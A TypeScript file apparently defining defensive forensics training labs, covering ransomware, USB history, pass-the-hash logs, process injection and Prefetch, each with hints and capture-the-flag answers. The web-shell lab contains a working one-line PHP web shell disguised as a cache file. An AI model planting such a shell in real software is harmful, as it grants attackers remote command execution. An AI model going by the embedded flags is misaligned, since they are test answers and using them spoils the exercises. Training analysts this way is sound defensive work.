import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function forensicsWs(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'forensics-ws', user: 'root', root: dir(files) };
}

export const forensicsAdvancedLabs: LabScenario[] = [
  {
    id: 'forensics-ransomware-note-analysis',
    title: 'Forensics: Ransomware Note & Encryption Artifact Analysis',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A file server was hit overnight — most documents now have a strange extension and there\'s a ransom ' +
      'note in every affected folder. Your job is to examine the note and the encrypted file headers to ' +
      'identify the ransomware family and, crucially, confirm whether this matches a strain with a known ' +
      'free decryptor before anyone considers paying.',
    objectives: [
      { text: 'Read the ransom note left on the desktop', why: 'The note itself — its wording, the extension it references, and any contact/payment details — is the fastest way to fingerprint which ransomware family you\'re dealing with.' },
      { text: 'Examine the encrypted file header artifact for a family-specific marker', why: 'Many ransomware families leave a distinctive byte marker or extension pattern in encrypted files — matching it against known threat intel is how responders decide whether a free decryptor might exist.' },
      { text: 'Capture the flag confirming the ransomware family identified', why: 'This single identification step determines the entire response strategy — restore from backup, check for a public decryptor, or in the worst case, begin a payment/negotiation process the legal and executive team must approve.' },
    ],
    hints: [
      'cat ~/Desktop/README_RECOVER_FILES.txt',
      'cat ~/encrypted-file-header.txt for the technical marker.',
      'The extension and marker together identify a specific, named ransomware family.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        Desktop: dir({
          'README_RECOVER_FILES.txt': file(
            'ALL YOUR FILES HAVE BEEN ENCRYPTED WITH .lockmeridian EXTENSION\n' +
              'To recover them, contact recovery@darkmail.example with your ID: 8841-MERIDIAN\n' +
              'Do not rename encrypted files or attempt recovery tools — this may corrupt them permanently.\n',
          ),
        }),
        'encrypted-file-header.txt': file(
          'Hex dump of first 16 bytes of quarterly-report.docx.lockmeridian:\n' +
            '4C 4F 434B 4D 45 52 49 44 49 41 4E 5F 76 32 00 00   "LOCKMERIDIAN_v2"\n' +
            'This marker matches the "LockMeridian v2" family in current threat intel feeds.\n' +
            'flag{ransomware_family_identified_lockmeridian_v2}\n',
        ),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-usb-exfiltration-history',
    title: 'Forensics: USB Device History Investigation',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'An employee under investigation for IP theft claims they "never used a USB drive" on their company ' +
      'laptop. Windows keeps a persistent history of every USB storage device ever connected, including its ' +
      'serial number and first/last connection times — even after the device is removed and the files ' +
      'themselves are gone.',
    objectives: [
      { text: 'Review the extracted USB device history artifact', why: 'This registry-style artifact (USBSTOR history) persists independently of whether files were copied and independently of the device still being present — it directly contradicts a suspect\'s denial.' },
      { text: 'Identify the device serial number and the timestamp it was last connected', why: 'Correlating the connection timestamp against the same employee\'s badge/login records is what turns "a USB drive was used" into "this specific person used it, at this specific time."' },
      { text: 'Capture the flag confirming the device was connected the day the employee resigned', why: 'Timing correlation — USB connected on the exact day of resignation, shortly before deleting local files — is exactly the pattern that turns a forensic artifact into defensible evidence for an IP theft case.' },
    ],
    hints: [
      'cat ~/usbstor-history.txt',
      'Note the LastConnected timestamp and cross-reference it against the case notes file.',
      'cat ~/case-notes.txt for the employee\'s resignation date.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        'usbstor-history.txt': file(
          'USBSTOR history extracted from registry hive:\n' +
            'Disk&Ven_SanDisk&Prod_Cruzer_Glide  Serial=4C531001771122334455  FirstConnected=2024-11-02  LastConnected=2026-07-11 17:42:00\n' +
            'flag{usb_device_connected_day_of_resignation}\n',
        ),
        'case-notes.txt': file('Employee resignation effective date: 2026-07-11. Access revoked 2026-07-12 08:00.\n'),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-browser-history-insider',
    title: 'Forensics: Browser History & Download Artifact Review',
    difficulty: 'Easy',
    category: 'Forensics',
    briefing:
      'Continuing the same insider investigation, review the employee\'s browser history export for evidence ' +
      'of searches or downloads related to data exfiltration methods — a very standard part of any real ' +
      'insider-threat forensic workflow.',
    objectives: [
      { text: 'Review the browser history export', why: 'Search queries immediately before an incident are some of the most direct evidence of intent available in any digital forensics case.' },
      { text: 'Identify the search query and downloaded tool related to data exfiltration', why: 'A search for "how to transfer files without IT detecting" followed immediately by downloading a file-transfer utility is a textbook pre-exfiltration pattern.' },
      { text: 'Capture the flag confirming the downloaded tool\'s name', why: 'Naming the specific tool matters for the technical response — it tells the SOC exactly what artifact/process name to hunt for on other endpoints in case this wasn\'t an isolated incident.' },
    ],
    hints: [
      'cat ~/browser-history-export.txt',
      'Look for search queries just before any download events.',
      'One search and the download immediately after it are the key evidence — read that section carefully.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        'browser-history-export.txt': file(
          [
            '2026-07-10 09:15  https://www.google.com/search?q=quarterly+sales+report+template',
            '2026-07-11 16:20  https://www.google.com/search?q=how+to+transfer+files+without+it+detecting',
            '2026-07-11 16:22  https://filetransfer-tool.example/download/portable-sync.exe',
            '2026-07-11 16:45  https://www.linkedin.com/jobs/view/8834521',
            'flag{search_history_reveals_exfil_tool_portable_sync}',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-pass-the-hash-eventlogs',
    title: 'Forensics: Windows Event Logs — Pass-the-Hash Indicators',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'A Windows server\'s security event log shows a successful network logon from an account that never ' +
      'normally logs in remotely, with logon type 3 (network) rather than the interactive type this account ' +
      'usually shows — a classic Pass-the-Hash indicator, since PtH authenticates over the network without ' +
      'ever needing the plaintext password.',
    objectives: [
      { text: 'Review the extracted Security event log entries', why: 'Windows Event ID 4624 (successful logon) records a "Logon Type" field that distinguishes interactive console logons (type 2) from network authentications (type 3) — the type field is the key evidence here.' },
      { text: 'Identify the anomalous logon type 3 event for an account that should only log in interactively', why: 'Pass-the-Hash specifically authenticates via NTLM over the network (type 3) — an account that historically only logs in at its own desk suddenly authenticating this way, from a different host, is a strong indicator.' },
      { text: 'Capture the flag from the anomalous event', why: 'This exact log signature is what many EDR/SIEM detection rules for lateral movement are built around — recognizing it manually is what lets an analyst validate (or question) an automated alert.' },
    ],
    hints: [
      'cat ~/security-eventlog-export.txt',
      'grep "Logon Type: 3" ~/security-eventlog-export.txt',
      'Compare the source host in that event against the account\'s normal logon host from other entries.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        'security-eventlog-export.txt': file(
          [
            'EventID=4624  Account=svc_report  LogonType=2 (Interactive)  SourceHost=FINANCE-PC-04  Time=2026-07-11 08:02:00',
            'EventID=4624  Account=svc_report  LogonType=2 (Interactive)  SourceHost=FINANCE-PC-04  Time=2026-07-11 13:15:00',
            'EventID=4624  Account=svc_report  LogonType=3 (Network)     SourceHost=UNKNOWN-10.10.50.99  Time=2026-07-11 23:58:04  <-- anomalous',
            '--- svc_report has never authenticated via network logon (type 3) before, and never from this host ---',
            'flag{pass_the_hash_logontype3_anomalous_network_auth}',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-webshell-discovery',
    title: 'Forensics: Web Shell Discovery on a Compromised Server',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A web server is running unusually slow and outbound traffic spiked overnight. Investigate the web ' +
      'root for a web shell — a small script an attacker uploads that accepts commands via HTTP parameters, ' +
      'giving them persistent remote code execution disguised as an ordinary file. This is one of the most ' +
      'commonly found artifacts in real compromised-web-server forensics engagements.',
    objectives: [
      { text: 'List the web root directory and look for a file that doesn\'t belong', why: 'Web shells are usually named to blend in with legitimate files (cache.php, config_backup.php) — a careful listing comparing file sizes/dates is often the first tell.' },
      { text: 'Read the suspicious file\'s contents to confirm it accepts and executes commands', why: 'Confirming the file actually contains command-execution code (not just an odd name) is what separates a confirmed web shell from a false positive.' },
      { text: 'Capture the flag embedded in the web shell', why: 'Once confirmed, the incident response step is immediate: preserve the file for evidence, then remove it and audit everything it may have been used to access in the meantime.' },
    ],
    hints: [
      'ls -la /var/www/html',
      'One file has a name that sounds legitimate but doesn\'t match the site\'s actual file-naming pattern.',
      'cat the suspicious file — a real web shell contains code like system($_REQUEST[...]) or eval(base64_decode(...)).',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      var: dir({
        www: dir({
          html: dir({
            'index.php': file('<?php echo "Welcome"; ?>\n', '-rw-r--r--'),
            'style-cache-v2.php': file(
              '<?php\n' +
                '// disguised as a CSS cache helper\n' +
                'if(isset($_REQUEST["c"])){ system($_REQUEST["c"]); }\n' +
                '// flag{webshell_disguised_as_style_cache_found}\n' +
                '?>\n',
              '-rw-r--r--',
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-memory-process-injection',
    title: 'Forensics: Memory Analysis — Process Injection Indicators',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'A memory capture from a compromised host shows one legitimate-looking process with memory region ' +
      'permissions that don\'t match its normal behavior — a hallmark of process injection, where malicious ' +
      'code is written into and executed from within a trusted process\'s memory space specifically to evade ' +
      'detection tools that only look at what\'s running on disk.',
    objectives: [
      { text: 'Review the extracted process memory map summary', why: 'Process injection leaves no trace on disk at all in many cases — memory analysis is often the only way to find it.' },
      { text: 'Identify the process with an unexpected RWX (read-write-execute) memory region', why: 'Legitimate code rarely needs a memory region that is simultaneously writable AND executable — that combination is one of the strongest process-injection indicators memory forensics tools look for.' },
      { text: 'Capture the flag confirming which legitimate process was used as the injection target', why: 'Naming the specific victim process (often something ordinary like explorer.exe or a browser) tells the response team exactly what to kill/investigate first, and confirms the technique used for the incident report.' },
    ],
    hints: [
      'cat ~/memory-map-summary.txt',
      'Look for a memory region flagged RWX — normal legitimate code is never both writable and executable at once.',
      'The process with the RWX region is the injection target.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        'memory-map-summary.txt': file(
          [
            'PID 1044  explorer.exe     0x00400000-0x00450000  R-X  (normal, code section)',
            'PID 1044  explorer.exe     0x02100000-0x02180000  RWX  <-- anomalous: writable AND executable',
            'PID 2201  chrome.exe       0x00400000-0x00600000  R-X  (normal)',
            'PID 3390  svchost.exe      0x00400000-0x00420000  R-X  (normal)',
            '--- explorer.exe (PID 1044) has an injected RWX region not present in a clean baseline ---',
            'flag{process_injection_rwx_region_in_explorer_exe}',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
  {
    id: 'forensics-prefetch-execution-proof',
    title: 'Forensics: Prefetch Artifact — Proving Program Execution',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A suspect deleted a hacking tool from their laptop before it could be seized, and claims it was ' +
      '"never actually run, just downloaded by mistake." Windows Prefetch files record execution metadata — ' +
      'including run count and last-run timestamp — for a program even after the program itself has been ' +
      'deleted, which is exactly the artifact that can disprove that claim.',
    objectives: [
      { text: 'Review the extracted Prefetch artifact listing', why: 'Prefetch files persist independently of the original executable — deleting the tool does not delete the evidence that it ran.' },
      { text: 'Identify the Prefetch entry matching the deleted tool\'s name and its run count', why: 'A run count greater than zero directly contradicts a "never actually run" claim — this is precisely why Prefetch analysis is a standard step in any digital forensics examination involving deleted tools.' },
      { text: 'Capture the flag confirming the number of times the tool was executed', why: 'The specific run count and last-run timestamp are exactly what gets cited in a forensic report or legal proceeding — "run three times, most recently the day before the device was surrendered" is a very different claim than "downloaded but never run."' },
    ],
    hints: [
      'cat ~/prefetch-listing.txt',
      'grep -i "dump" ~/prefetch-listing.txt to find the entry matching a credential-dumping tool name.',
      'The RunCount field is the direct evidence contradicting the "never run" claim.',
    ],
    totalFlags: 1,
    attacker: forensicsWs({
      root: dir({
        'prefetch-listing.txt': file(
          [
            'CHROME.EXE-A1B2C3D4.pf     RunCount=142  LastRun=2026-07-11 18:02:00',
            'EXPLORER.EXE-B2C3D4E5.pf   RunCount=980  LastRun=2026-07-11 18:10:00',
            'MIMIDUMP.EXE-C3D4E5F6.pf   RunCount=3    LastRun=2026-07-10 23:41:00  <-- the "never run" tool',
            '--- the executable was deleted from disk, but its Prefetch record proves it ran 3 times ---',
            'flag{prefetch_proves_tool_executed_3_times}',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
];
